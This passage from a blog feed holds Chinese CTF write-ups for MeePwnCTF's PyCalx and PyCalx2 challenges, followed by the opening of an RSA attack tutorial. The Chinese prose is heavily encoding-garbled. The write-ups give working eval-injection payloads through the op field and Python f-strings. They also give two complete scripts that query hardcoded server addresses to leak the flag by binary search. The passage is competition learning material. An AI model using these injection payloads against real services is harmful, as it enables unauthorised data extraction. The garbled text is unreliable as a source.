ÈáåÁöÑÂ≠óÁ¨¶„ÄÇ</li><li>opËá≥Â∞ë1‰∏™Â≠óÁ¨¶ÔºåËá≥Â§ö2‰∏™Ôºå‰∏îÈ¶ñÂ≠óÁ¨¶ÂøÖÈ°ªÂú®ÁôΩÂêçÂçï<code>+-*/=!</code> Èáå„ÄÇ</li><li>value1,value2Ë¶Å‰πàÈÉΩÊòØÂè™ÂåÖÂê´<code>[0-9]</code>ÔºåË¶Å‰πàÈÉΩÂåÖÂê´ÂÖ∂‰ªñÂ≠óÁ¨¶„ÄÇ</li><li>ÊâßË°å<code>str(eval(str(repr(value1)) + str(op) + str(repr(value2))))</code> Ôºå‰∏îÂè™ÊúâÁªìÊûúÊòØboolÂÄºÊàñÂè™ÂåÖÂê´<code>[0-9]</code> Êó∂Êâç‰ºöËæìÂá∫„ÄÇ<ul><li>Ê≥®ÔºöreprËøîÂõûÂØπË±°ÁöÑÂèØÊâìÂç∞ÂΩ¢ÂºèÔºåÂíåÂèçÂºïÂè∑ÂåÖË£πÊïàÊûú‰∏ÄËá¥ÔºåÂØπÂ§ßÂ§öÊï∞Á±ªÂûãÔºå‰ªñ‰ºöËøîÊúâ‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤Ôºå‰ΩøÂÖ∂ÂèØ‰ª•‰Ωú‰∏∫‰ª£Á†ÅÁõ¥Êé•‰º†ÂÖ•evalÊâßË°å„ÄÇ</li></ul></li></ul></li></ul><p>Ëß£È¢òÊÄùË∑ØÔºö<code>op</code> ÂÖÅËÆ∏‰∏§‰∏™Â≠óÁ¨¶Ôºå‰∏îÁ¨¨‰∫å‰∏™Â≠óÁ¨¶ÊòØ‰ªªÊÑèÁöÑÔºåÈÇ£‰πàÂ¶ÇÊûúÊòØ‰∏Ä‰∏™ÂçïÂºïÂè∑ÔºåÂ∞±ËÉΩÊ∑∑Ê∑Ü‰ª£Á†ÅÂíåÊï∞ÊçÆÔºåËµ∑Âà∞Á±ª‰ººSQLÊ≥®ÂÖ•ÁöÑÊïàÊûú„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(repr(<span class="string">"a"</span>))+str(<span class="string">"+"</span>)+str(repr(<span class="string">"b"</span>)))</span><br><span class="line"><span class="string">'a'</span>+<span class="string">'b'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(repr(<span class="string">"a"</span>))+str(<span class="string">"+'"</span>)+str(repr(<span class="string">"&lt; b#"</span>)))</span><br><span class="line"><span class="string">'a'</span>+<span class="string">''</span>&lt; b<span class="comment">#'</span></span><br></pre></td></tr></table></figure><p>Ëß£È¢òËÑöÊú¨Ôºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(v1, v2, op, s)</span>:</span></span><br><span class="line">    u = <span class="string">"http://178.128.96.203/cgi-bin/server.py?"</span></span><br><span class="line">    payload = dict(value1=v1, value2=v2, op=op, source=s)</span><br><span class="line">    <span class="comment"># print payload</span></span><br><span class="line">    r = requests.get(u, params=payload)</span><br><span class="line">    <span class="comment"># print r.url</span></span><br><span class="line">    res = re.findall(<span class="string">"&lt;pre&gt;\n&gt;&gt;&gt;&gt;([\s\S]*)\n&gt;&gt;&gt; &lt;\/pre&gt;"</span>,</span><br><span class="line">                     r.content)[<span class="number">0</span>].split(<span class="string">'\n'</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">assert</span> (res != <span class="string">'Invalid'</span>)</span><br><span class="line">    <span class="keyword">return</span> res == <span class="string">'True'</span></span><br><span class="line">    <span class="comment"># print r.content</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(mid)</span>:</span></span><br><span class="line">    s = flag + chr(mid)</span><br><span class="line">    <span class="keyword">return</span> calc(v1, v2, op, s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin_search</span><span class="params">(seq=xrange<span class="params">(<span class="number">0x20</span>, <span class="number">0x80</span>)</span>, lo=<span class="number">0</span>, hi=None)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> (lo &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> hi == <span class="keyword">None</span>: hi = len(seq)</span><br><span class="line">    <span class="keyword">while</span> lo &lt; hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        <span class="comment"># print lo, mid, hi, "\t",</span></span><br><span class="line">        <span class="keyword">if</span> check(seq[mid]): hi = mid</span><br><span class="line">        <span class="keyword">else</span>: lo = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> seq[lo]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">v1, v2, op, s = <span class="string">'x'</span>, <span class="string">"+FLAG&lt;value1+source#"</span>, <span class="string">"+'"</span>, <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    flag += chr(bin_search() - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> flag</span><br><span class="line"><span class="comment"># MeePwnCTF&#123;python3.66666666666666_([_((you_passed_this?]]]]]])&#125;</span></span><br></pre></td></tr></table></figure><p><img src="1531905259492.png" alt="1531905259492"></p><h1 id="PyCalx2"><a href="#PyCalx2" class="headerlink" title="PyCalx2"></a>PyCalx2</h1><blockquote><p>You should solve <code>PyCalx</code> first. </p><p><a href="http://206.189.223.3/cgi-bin/server.py?source=1" target="_blank" rel="noopener">http://206.189.223.3/cgi-bin/server.py?source=1</a>  </p></blockquote><p><code>server.py</code> Âè™ÊîπÂä®‰∫Ü‰∏ÄË°å‰ª£Á†ÅÔºåÂ∞Ü<code>op = get_op(arguments[&#39;op&#39;].value)</code> ÂèòÊàê‰∫Ü <code>op = get_op(get_value(arguments[&#39;op&#39;].value))</code>  Ôºå‰πüÂ∞±ÊòØËØ¥Â∞Ü<code>op</code> ÂèÇÊï∞‰πüËøõË°å‰∫ÜÈªëÂêçÂçïËøáÊª§Ôºå‰∫éÊòØ <code>op</code> ÁöÑÁ¨¨‰∫å‰∏™Â≠óÁ¨¶Â∞±‰∏çËÉΩÊòØÂçïÂºïÂè∑ÔºåÁ¨¨‰∏ÄÈ¢òÁöÑÊñπÊ≥ï‰πüÂ∞±Â§±Êïà‰∫Ü„ÄÇ</p><p>ÁªìÂêàÈ¢òÁõÆÊèêÁ§∫ÂíåÁ¨¨‰∏ÄÈ¢òÁöÑflagÂéªÂØªÊâæPython3.6ÁöÑÊñ∞ÁâπÊÄßÔºåÁî®Âà∞‰∫ÜËøô‰∏™ <code>f-string</code> ÔºåËØ¶ËßÅ<a href="https://www.python.org/dev/peps/pep-0498/" target="_blank" rel="noopener">PEP 498 ‚Äì Literal String Interpolation</a> „ÄÇÁÆÄË®Ä‰πãÂ∞±ÊòØÂèØ‰ª•Âú®Â≠óÁ¨¶‰∏≤‰∏≠Êñπ‰æøÂú∞Áõ¥Êé•ÊèíÂÖ•Ë°®ËææÂºèÔºå‰ª•<code>f</code> ÂºÄÂ§¥ÔºåË°®ËææÂºèÊèíÂú®Â§ßÊã¨Âè∑<code>{}</code> ÈáåÔºåÂú®ËøêË°åÊó∂Ë°®ËææÂºè‰ºöË¢´ËÆ°ÁÆóÂπ∂ÊõøÊç¢ÊàêÂØπÂ∫îÁöÑÂÄº„ÄÇ</p><p>Êú¨È¢ò‰∏ªË¶ÅÊòØÂà©Áî®Ëøô‰∏™ÁâπÊÄßÂú®Â≠óÁ¨¶‰∏≤ÈáåÊèíÂÖ•ÊØîËæÉÁöÑË°®ËææÂºèÔºåÂâ©‰∏ãÁöÑÂ∞±Âíå‰∏äÈ¢ò‰∏ÄÊ†∑‰∫Ü„ÄÇÊèíÊ≥ï‰∏çÂ∞ΩÁõ∏ÂêåÔºåCTF Time‰∏äÁöÑWPÈáåÊúâËøô‰πà‰∏§ÁßçÔºåÁõ∏‰ø°ËøòÂèØ‰ª•ÊúâÂÖ∂‰ªñÁöÑÊñπÊ≥ïÔºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>str(repr(<span class="string">'T'</span>))+str(<span class="string">'+f'</span>)+str(repr(<span class="string">'ru&#123;FLAG&lt;source or 14:x&#125;'</span>)) <span class="comment"># 14ÁöÑÂçÅÂÖ≠ËøõÂà∂Ë°®Á§∫Êó∂'e'</span></span><br><span class="line"><span class="string">"'T'+f'ru&#123;FLAG&lt;source or 14:x&#125;'"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>eval(str(repr(<span class="string">'T'</span>))+str(<span class="string">'+f'</span>)+str(repr(<span class="string">'ru&#123;1 or 14:x&#125;'</span>)))</span><br><span class="line"><span class="string">'Tru1'</span> <span class="comment"># ËøîÂõûInvalid</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>eval(str(repr(<span class="string">'T'</span>))+str(<span class="string">'+f'</span>)+str(repr(<span class="string">'ru&#123;0 or 14:x&#125;'</span>)))</span><br><span class="line"><span class="string">'True'</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>str(repr(<span class="string">'Tru'</span>))+str(<span class="string">'+f'</span>)+str(repr(<span class="string">'&#123;sys.exit.__name__:&#123;FLAG&lt;source:1&#125;.1&#125;'</span>))</span><br><span class="line"><span class="string">"'Tru'+f'&#123;sys.exit.__name__:&#123;FLAG&lt;source:1&#125;.1&#125;'"</span></span><br><span class="line"><span class="comment"># &#123;FLAG&lt;source:1&#125;ÁöÑÂÄºÁõ∏ÂΩì‰∫éprintf("%1f",FLAG&lt;source)ÁöÑÁªìÊûúÔºåÊúâ0Âíå1‰∏§ÁßçÂèØËÉΩ„ÄÇ</span></span><br><span class="line"><span class="comment">#ËøôËæπsys.exit.__name__Á≠â‰ª∑‰∫éÂ≠óÁ¨¶‰∏≤'exit'ÔºåËÄÉËôëÂà∞Â∑≤Áªèimport escapeÔºåÁõ¥Êé•Áî®escape.__name__‰πüÂèØ„ÄÇ</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>eval(str(repr(<span class="string">'Tru'</span>))+str(<span class="string">'+f'</span>)+str(repr(<span class="string">'&#123;sys.exit.__name__:&#123;1:1&#125;.1&#125;'</span>)))</span><br><span class="line"><span class="string">'True'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>eval(str(repr(<span class="string">'Tru'</span>))+str(<span class="string">'+f'</span>)+str(repr(<span class="string">'&#123;sys.exit.__name__:&#123;0:1&#125;.1&#125;'</span>)))</span><br><span class="line"><span class="comment">#Êä•ÈîôÔºåËøîÂõûInvalid</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">"&lt;string&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ValueError: <span class="string">'='</span> alignment <span class="keyword">not</span> allowed <span class="keyword">in</span> string format specifier</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>Ëß£È¢òËÑöÊú¨Ôºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(v1, v2, op, s)</span>:</span></span><br><span class="line">    u = <span class="string">"http://206.189.223.3/cgi-bin/server.py?"</span></span><br><span class="line">    payload = dict(value1=v1, value2=v2, op=op, source=s)</span><br><span class="line">    r = requests.get(u, params=payload)</span><br><span class="line">    res = re.findall(<span class="string">"&lt;pre&gt;\n&gt;&gt;&gt;&gt;([\s\S]*)\n&gt;&gt;&gt; &lt;\/pre&gt;"</span>,</span><br><span class="line">                     r.content)[<span class="number">0</span>].split(<span class="string">'\n'</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> res == <span class="string">'Invalid'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(mid)</span>:</span></span><br><span class="line">    s = flag + chr(mid)</span><br><span class="line">    <span class="keyword">return</span> calc(v1, v2, op, s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin_search</span><span class="params">(seq=xrange<span class="params">(<span class="number">0x20</span>, <span class="number">0x80</span>)</span>, lo=<span class="number">0</span>, hi=None)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> (lo &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> hi == <span class="keyword">None</span>: hi = len(seq)</span><br><span class="line">    <span class="keyword">while</span> lo &lt; hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> check(seq[mid]): hi = mid</span><br><span class="line">        <span class="keyword">else</span>: lo = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> seq[lo]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">v1, op, v2, s = <span class="string">'T'</span>, <span class="string">"+f"</span>, <span class="string">"ru&#123;FLAG&lt;source or 14:x&#125;"</span>, <span class="string">'a'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    flag += chr(bin_search() - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> flag</span><br><span class="line"><span class="comment"># MeePwnCTF&#123;python3.6[_strikes_backkkkkkkkkkkk)&#125;</span></span><br></pre></td></tr></table></figure><p><img src="1531905207979.png" alt="1531905207979"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;Êú¨ÊñáÈ¶ñÂèë &lt;a href=&quot;https://xz.aliyun.com/t/2446&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ÂÖàÁü•Á§æÂå∫&lt;/a&gt; ÔºåËΩ¨ËΩΩËØ∑Ê≥®ÊòéÈìæÊé•„ÄÇ&lt;/strong&gt; &lt;/p&gt;
&lt;h1 id=&quot;PyCalx&quot;&gt;&lt;a hr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CTF‰∏≠Â∏∏ËßÅÁöÑRSAÁõ∏ÂÖ≥ÈóÆÈ¢òÊÄªÁªì</title>
    <link href="https://findneo.github.io/180727rsa-attack/"/>
    <id>https://findneo.github.io/180727rsa-attack/</id>
    <published>2018-07-15T11:41:04.000Z</published>
    <updated>2019-01-25T23:21:37.054Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Êú¨ÊñáÈ¶ñÂèë<a href="https://xz.aliyun.com/t/2446" target="_blank" rel="noopener">ÂÖàÁü•Á§æÂå∫</a> ÔºåËΩ¨ËΩΩËØ∑Ê≥®ÊòéÈìæÊé•„ÄÇ</strong> </p><h1 id="CTF‰∏≠Â∏∏ËßÅÁöÑRSAÁõ∏ÂÖ≥ÈóÆÈ¢òÊÄªÁªì"><a href="#CTF‰∏≠Â∏∏ËßÅÁöÑRSAÁõ∏ÂÖ≥ÈóÆÈ¢òÊÄªÁªì" class="headerlink" title="CTF‰∏≠Â∏∏ËßÅÁöÑRSAÁõ∏ÂÖ≥ÈóÆÈ¢òÊÄªÁªì"></a>CTF‰∏≠Â∏∏ËßÅÁöÑRSAÁõ∏ÂÖ≥ÈóÆÈ¢òÊÄªÁªì</h1><h1 id="ÂâçË®Ä"><a href="#ÂâçË®Ä" class="headerlink" title="ÂâçË®Ä"></a>ÂâçË®Ä</h1><p>‚ÄãÁêÜËß£Âü∫Êú¨Ê¶ÇÂøµÂêéÔºå‰ª£Á†ÅÂ∞±ÂèØ‰ª•ËØ¥Êòé‰∏ÄÂàáÔºåÊâÄ‰ª•Êú¨ÊñáÂ∞ÜÊØèÁßçÊîªÂáªÊñπÂºèÁöÑÂÆûÁé∞ÊñπÊ≥ïÈÉΩÊèêÁÇºÊàê‰∫Ü‰∏Ä‰∏™ÂáΩÊï∞ÔºåÂú®ÁêÜËß£ÂéüÁêÜÊó∂‰ºöÊúâÂ∏ÆÂä©ÔºåÂú®ÈúÄË¶ÅÊó∂‰πüÂèØ‰ª•Áõ¥Êé•Ë∞ÉÁî®„ÄÇ</p><h1 id="Âü∫Á°Ä"><a href="#Âü∫Á°Ä" class="headerlink" title="Âü∫Á°Ä"></a>Âü∫Á°Ä</h1><h2 id="RSAÊ¶ÇË¶Å"><a href="#RSAÊ¶ÇË¶Å" class="headerlink" title="RSAÊ¶ÇË¶Å"></a>RSAÊ¶ÇË¶Å</h2><p>Âú®ÂºÄÂßãÂâçÂèØ‰ª•ÈÄöËøá <a href="http://www.guideep.com/read?guide=5676830073815040" target="_blank" rel="noopener">„ÄäRSAÁÆóÊ≥ïËØ¶Ëß£„Äã</a> ËøôÁØáÊñáÁ´†‰∫ÜËß£ÂÖ≥‰∫éRSAÁöÑÂü∫Á°ÄÁü•ËØÜÔºåÂåÖÊã¨Âä†Ëß£ÂØÜÊñπÊ≥ïÔºåÁÆóÊ≥ïÂéüÁêÜÂíåÂèØË°åÊÄßËØÅÊòéÁ≠â„ÄÇ</p><h2 id="Â∫îÁî®ÊµÅÁ®ã"><a href="#Â∫îÁî®ÊµÅÁ®ã" class="headerlink" title="Â∫îÁî®ÊµÅÁ®ã"></a>Â∫îÁî®ÊµÅÁ®ã</h2><ol><li>ÈÄâÂèñ‰∏§‰∏™ËæÉÂ§ßÁöÑ‰∫í‰∏çÁõ∏Á≠âÁöÑË¥®Êï∞pÂíåqÔºåËÆ°ÁÆó<code>n = p * q</code> „ÄÇ</li><li>ËÆ°ÁÆó<code>phi = (p-1) * (q-1)</code> „ÄÇ</li><li>ÈÄâÂèñ‰ªªÊÑèeÔºå‰ΩøÂæóeÊª°Ë∂≥ <code>1&lt;e&lt;phi</code> ‰∏î <code>gcd(e , phi) == 1</code> „ÄÇ</li><li>ËÆ°ÁÆóeÂÖ≥‰∫é phi ÁöÑÊ®°ÈÄÜÂÖÉdÔºå Âç≥dÊª°Ë∂≥<code>(e * d)% phi ==1</code>  „ÄÇ</li><li>Âä†Ëß£ÂØÜÔºö<code>c = (m ^ e) % n</code> Ôºå <code>m = (c ^ d) % n</code> „ÄÇÂÖ∂‰∏≠m‰∏∫ÊòéÊñáÔºåc‰∏∫ÂØÜÊñáÔºå(n,e)‰∏∫ÂÖ¨Èí•ÂØπÔºåd‰∏∫ÁßÅÈí•ÔºåË¶ÅÊ±Ç <code>0 &lt;= m &lt; n</code> „ÄÇ</li></ol><h2 id="ÁêÜËß£Ê®°ÈÄÜËøêÁÆó"><a href="#ÁêÜËß£Ê®°ÈÄÜËøêÁÆó" class="headerlink" title="ÁêÜËß£Ê®°ÈÄÜËøêÁÆó"></a>ÁêÜËß£Ê®°ÈÄÜËøêÁÆó</h2><ul><li>Â¶ÇÊûú<code>(a*b)%c==1</code> ÔºåÈÇ£‰πàaÂíåb‰∫í‰∏∫ÂØπÊñπÊ®°cÁöÑÊ®°ÈÄÜÂÖÉ/Êï∞ËÆ∫ÂÄíÊï∞Ôºå‰πüÂÜô‰Ωú<img src="1531107643807.png" alt="mod_inv"> „ÄÇ</li><li>ÂÖ≥‰∫éÊúÄÂ§ßÂÖ¨Á∫¶Êï∞Êúâ‰∏Ä‰∏™Âü∫Êú¨‰∫ãÂÆûÔºö<code>Áªô‰∫à‰∏§Êï¥Êï∞a„ÄÅcÔºåÂøÖÂ≠òÂú®Êï¥Êï∞x„ÄÅy‰ΩøÂæóax + cy = gcd(a,c)</code>  ÔºåÂü∫‰∫éËøô‰∏™‰∫ãÂÆûÔºåÂΩìa,c‰∫íÁ¥†Âç≥<code>gcd(a,c)==1</code> Êó∂ÔºåÊúâ<code>ax+cy=1</code> ÔºåÈÇ£‰πàÂ∞±Êúâ<code>(a*x)%c==1</code> ÔºåÊâÄ‰ª•xÂ∞±ÊòØa ÂØπcÁöÑÊ®°ÈÄÜÂÖÉ„ÄÇÂõ†Ê≠§ÔºåaÂØπcÂ≠òÂú®Ê®°ÈÄÜÂÖÉbÁöÑÂÖÖË¶ÅÊù°‰ª∂ÊòØ<code>gcd(a,c)==1</code> „ÄÇÊòæÁÑ∂ÂØπ‰∫éÊØè‰∏ÄÁªÑ<code>a,c</code> ÔºåÂ≠òÂú®‰∏ÄÊóèÊª°Ë∂≥Êù°‰ª∂ÁöÑxÔºåÂú®Ê±ÇÊ®°ÈÄÜÂÖÉÊó∂Êàë‰ª¨ÂèñÂæóÊòØÊúÄÂ∞èÊ≠£Êï¥Êï∞Ëß£<code>x mod n</code> „ÄÇ</li><li>‰∏äËø∞ÁöÑÂü∫Êú¨‰∫ãÂÆûÂæàÂÆπÊòìÁêÜËß£ÔºåÂõ†‰∏∫aÂíåcÁöÑÊúÄÂ§ßÂÖ¨Á∫¶Êï∞ÊòØgcd(a,b)ÔºåÊâÄ‰ª•aÂíåcÈÉΩÂèØË°®Á§∫‰∏∫gcd(a,b)ÁöÑÊï¥Êï∞ÂÄçÔºåÈÇ£‰πàaÂíåbÁöÑ‰ªªÊÑèÊï¥Á≥ªÊï∞ÁöÑÁ∫øÊÄßÁªÑÂêàax+by‰πüÂøÖÂÆöËÉΩË°®Á§∫Êàêgcd(a,c)ÁöÑÊï¥Êï∞ÂÄçÔºå‰ªñ‰ª¨ÂΩì‰∏≠ÊúÄÂ∞èÁöÑÊ≠£Êï¥Êï∞Â∞±Â∫îËØ•ÊòØgcd(a,c)„ÄÇÂÆûÈôÖ‰∏äÊúÄÂ§ßÂÖ¨Á∫¶Êï∞Êúâ‰∏Ä‰∏™ÂÆö‰πâÂ∞±ÊòØÔºö<code>aÂíåbÁöÑÊúÄÂ§ßÂÖ¨Á∫¶Êï∞gÊòØaÂíåbÁöÑÁ∫øÊÄßÂíå‰∏≠ÁöÑÊúÄÂ∞èÊ≠£Êï¥Êï∞</code>  „ÄÇ</li></ul><ul><li><p>Ê±ÇÊ®°ÈÄÜÂÖÉ‰∏ªË¶ÅÂü∫‰∫éÊâ©Â±ïÊ¨ßÂá†ÈáåÂæóÁÆóÊ≥ïÔºåË¥¥‰∏Ä‰∏™PythonÂÆûÁé∞Ôºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">egcd</span> <span class="params">( a , b )</span>:</span></span><br><span class="line">     <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">         <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">         x , y , q = egcd( b , a % b ) <span class="comment"># q = GCD(a, b) = GCD(b, a%b)</span></span><br><span class="line">         x , y = y, ( x - (a // b) * y )</span><br><span class="line">         <span class="keyword">return</span> x, y, q </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod_inv</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> egcd(a,b)[<span class="number">0</span>]%b <span class="comment">#Ê±ÇaÊ®°bÂæóÈÄÜÂÖÉ</span></span><br></pre></td></tr></table></figure></li></ul><ul><li>Ê±ÇÊ®°ÈÄÜ‰πüÂèØÁõ¥Êé•Âà©Áî®gmpy2Â∫ì„ÄÇÂ¶Ç <code>import gmpy2;print gmpy2.invert(47,30)</code> ÂèØÊ±ÇÂæó47Ê®°30ÁöÑÈÄÜ‰∏∫23„ÄÇ<h2 id="Ê®°ÊÑè‰πâ‰∏ãÁöÑËøêÁÆóÊ≥ïÂàô"><a href="#Ê®°ÊÑè‰πâ‰∏ãÁöÑËøêÁÆóÊ≥ïÂàô" class="headerlink" title="Ê®°ÊÑè‰πâ‰∏ãÁöÑËøêÁÆóÊ≥ïÂàô"></a>Ê®°ÊÑè‰πâ‰∏ãÁöÑËøêÁÆóÊ≥ïÂàô</h2></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(a + b) % n ‚â° (a % n + b % n) % n</span><br><span class="line">(a - b) % n ‚â° (a % n - b % n) % n</span><br><span class="line">(a * b) % n ‚â° (a % n * b % n) % n</span><br><span class="line">(a ^ b) % n ‚â° ((a % n) ^ b) % n <span class="comment">//ÂπÇËøêÁÆó</span></span><br><span class="line"></span><br><span class="line">Ëã• a ‚â° b(mod n) ,Âàô</span><br><span class="line"><span class="number">1.</span>ÂØπ‰∫é‰ªªÊÑèÊ≠£Êï¥Êï∞c,Êúâa^c ‚â° b^c(mod n)</span><br><span class="line"><span class="number">2.</span>ÂØπ‰∫é‰ªªÊÑèÊï¥Êï∞c,Êúâac ‚â° bc(mod n),a+c ‚â° b+c(mod n),</span><br><span class="line"><span class="number">3.</span>Ëã• c ‚â° d(mod n),Âàôa-c ‚â° b-d(mod n),a+c ‚â° b+d(mod n),ac ‚â° bd(mod n)</span><br><span class="line"></span><br><span class="line">Â¶ÇÊûúac‚â°bc (mod m)Ôºå‰∏îcÂíåm‰∫íË¥®ÔºåÂàôa‚â°b (mod mÔºâ„ÄÇ</span><br><span class="line">[ÁêÜËß£ÔºöÂΩì‰∏î‰ªÖÂΩìcÂíåm‰∫íË¥®,c^<span class="number">-1</span>Â≠òÂú®,Á≠âÂºèÂ∑¶Âè≥ÂèØÂêå‰πòÊ®°ÈÄÜ„ÄÇ]</span><br><span class="line"></span><br><span class="line">Èô§Ê≥ïËßÑÂàôÔºö</span><br><span class="line">Âú®Ê®°nÊÑè‰πâ‰∏ãÔºåa/b‰∏çÂÜç‰ªÖ‰ªÖ‰ª£Ë°®Ëøô‰∏§‰∏™Êï∞Áõ∏Èô§ÔºåËÄåÊòØÊåá a+k1*n Âíå b+k2*nËøô‰∏§‰∏™ÁªÑÊï∞‰∏≠‰ªªÊÑè‰∏§‰∏™Áõ∏Èô§Ôºå‰ΩøÂïÜ‰∏∫Êï¥Êï∞</span><br><span class="line">Âõ†Ê≠§‰πüÂ∞±ÂèØ‰ª•ÁêÜËß£ÔºåÈô§‰ª•‰∏Ä‰∏™Êï∞Á≠â‰ª∑‰∫é‰πò‰ª•ÂÆÉÁöÑÈÄÜ</span><br><span class="line">a/b ‚â° c(mod n) &lt;=&gt; a ‚â° c*(b^<span class="number">-1</span>) (mod 